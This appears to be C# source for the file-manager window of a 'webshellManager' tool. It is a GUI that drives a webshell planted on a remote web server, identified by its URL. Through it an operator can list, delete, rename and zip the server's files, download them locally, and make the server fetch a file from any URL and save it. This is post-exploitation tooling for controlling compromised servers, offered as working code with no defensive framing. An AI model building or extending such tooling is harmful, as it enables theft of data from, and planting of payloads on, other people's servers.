using Microsoft.VisualBasic;
using System;
using System.Collections.Generic;
using System.Windows.Forms;

namespace webshellManager
{
    public partial class fileManagerForm : Form
    {
        private Webshell selectedWebShell;
        private List<File> filesInCurrentFolder = new List<File>();
        private List<Folder> foldersInCurrentFolder = new List<Folder>();

        public fileManagerForm(Webshell selected)
        {
            this.selectedWebShell = selected;
            InitializeComponent();
            this.Text = "File Manager - " + selected.getUrl();
        }

        private string selectedFilePath(ListViewItem selected)
        {
            foreach (File oneFile in filesInCurrentFolder)
            {
                if (selected.Name == oneFile.name) return tbPath.Text + selectedWebShell.getDirectorySeparator() + oneFile.name;
            }
            Console.WriteLine("this is not a File object");
            return null;
        }

        private string selectedFolderPath(ListViewItem selected)
        {
            foreach (Folder oneFolder in foldersInCurrentFolder)
            {
                if (selected.Name == oneFolder.name) return tbPath.Text + selectedWebShell.getDirectorySeparator() + oneFolder.name;
            }
            Console.WriteLine("this is not a Folder object");
            return null;
        }

        private void listFiles(String path)
        {
            lvExplorer.Items.Clear();
            Tuple<List<Folder>, List<File>, string> data = selectedWebShell.browse(path);
            tbPath.Text = data.Item3; //set the realpath
            this.foldersInCurrentFolder = data.Item1;
            this.filesInCurrentFolder = data.Item2;

            foreach (Folder oneFolder in data.Item1)
            {
                ListViewItem lvi = new ListViewItem(new string[] { oneFolder.name, "0", "", oneFolder.permisions });
                lvi.ImageIndex = 0;
                lvi.Tag = "folder";
                lvi.Name = oneFolder.name;
                lvExplorer.Items.Add(lvi);
            }

            foreach (File oneFile in data.Item2)
            {
                ListViewItem lvi = new ListViewItem(new string[] { oneFile.name, oneFile.size, oneFile.lastMod, oneFile.permisions });
                lvi.ImageIndex = 1;
                lvi.Tag = "file";
                lvi.Name = oneFile.name;
                lvExplorer.Items.Add(lvi);

                for (int i = 0; i < imgListExplorer.Images.Count; i++) // set image with mime type
                {
                    if (oneFile.type.Contains(imgListExplorer.Images.Keys[i].ToString()))
                    {
                        lvi.ImageIndex = i;
                        break;
                    }
                }
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            listFiles(tbPath.Text);
        }

        private void lvExplorer_DoubleClick(object sender, EventArgs e)
        {
            if ((string)lvExplorer.SelectedItems[0].Tag == "folder") listFiles(tbPath.Text + selectedWebShell.getDirectorySeparator() + lvExplorer.SelectedItems[0].Text);
        }

        private void fileManagerForm_Load(object sender, EventArgs e)
        {
            listFiles(".");
        }

        private void cmsFileManager_Opening(object sender, System.ComponentModel.CancelEventArgs e)
        {
            if (lvExplorer.SelectedItems.Count == 0)
            {
                cmsFileManager.Items[0].Enabled = cmsFileManager.Items[1].Enabled = cmsFileManager.Items[2].Enabled =
                    cmsFileManager.Items[3].Enabled = cmsFileManager.Items[4].Enabled = cmsFileManager.Items[9].Enabled = false;
            }
            else
            {
                cmsFileManager.Items[0].Enabled = cmsFileManager.Items[1].Enabled = cmsFileManager.Items[2].Enabled =
                    cmsFileManager.Items[3].Enabled = cmsFileManager.Items[4].Enabled = cmsFileManager.Items[9].Enabled = true;
            }
        }

        private void tsmiProperties_Click(object sender, EventArgs e)
        {
            if (lvExplorer.SelectedItems.Count > 0)
            {
                foreach (ListViewItem lvI in lvExplorer.SelectedItems)
                {
                    if ((string)lvI.Tag == "file")
                    {
                        fileInformationsForm fileInformationForm = new fileInformationsForm(selectedWebShell, selectedFilePath(lvI));
                        fileInformationForm.Show();
                    }
                }
            }
        }

        private void tsmiNDir_Click(object sender, EventArgs e)
        {
            string folderName = Interaction.InputBox("name", "folder name", "");
            if (folderName.Length > 0)
            {
                selectedWebShell.newDir(tbPath.Text + selectedWebShell.getDirectorySeparator() + folderName);
                listFiles(tbPath.Text);
            }
        }

        private void tsmiDelete_Click(object sender, EventArgs e)
        {
            if (lvExplorer.SelectedItems.Count > 0)
            {
                foreach (ListViewItem lvI in lvExplorer.SelectedItems)
                {
                    if ((String)lvI.Tag == "file") selectedWebShell.delete(selectedFilePath(lvI)); else selectedWebShell.delete(selectedFolderPath(lvI));
                }
                listFiles(tbPath.Text);
            }
        }

        private void tsmiRename_Click(object sender, EventArgs e)
        {
            if (lvExplorer.SelectedItems.Count > 0)
            {
                foreach (ListViewItem lvI in lvExplorer.SelectedItems)
                {
                    string newName = Interaction.InputBox("name", "file name", lvI.Name);
                    if (newName.Length > 0)
                    {
                        string newPth = tbPath.Text + selectedWebShell.getDirectorySeparator() + newName;
                        if ((String)lvI.Tag == "file") selectedWebShell.rename(selectedFilePath(lvI), newPth); else selectedWebShell.rename(selectedFolderPath(lvI), newPth);
                        listFiles(tbPath.Text);
                    }
                }
            }
        }

        private void tsmiZIP_Click(object sender, EventArgs e)
        {
            if (lvExplorer.SelectedItems.Count > 0)
            {
                foreach (ListViewItem lvI in lvExplorer.SelectedItems)
                {
                    if ((String)lvI.Tag == "file") selectedWebShell.zip(selectedFilePath(lvI)); else selectedWebShell.zip(selectedFolderPath(lvI));
                }
            }
            listFiles(tbPath.Text);
        }

        private void tsmiUpload_Click(object sender, EventArgs e)
        {
            string url = Interaction.InputBox("URL", "upload");
            string filename = Interaction.InputBox("filename", "upload");
            if (url.Length > 0 && filename.Length > 0)
            {
                selectedWebShell.upload(url, tbPath.Text + selectedWebShell.getDirectorySeparator() + filename);
            }
            listFiles(tbPath.Text);
        }

        private void tsmiDownload_Click(object sender, EventArgs e)
        {
            if (lvExplorer.SelectedItems.Count > 0)
            {
                foreach (ListViewItem lvI in lvExplorer.SelectedItems)
                {
                    if ((String)lvI.Tag == "file")
                    {
                        sfdDownload.FileName = lvI.Name;
                        if (sfdDownload.ShowDialog() == DialogResult.OK)
                        {
                            byte[] data = selectedWebShell.download(selectedFilePath(lvI));
                            System.IO.File.WriteAllBytes(sfdDownload.FileName, data);
                        }
                    }
                    else
                    {
                        MessageBox.Show(lvI.Name + " must be compressed.");
                    }
                }
            }
        }
    }
}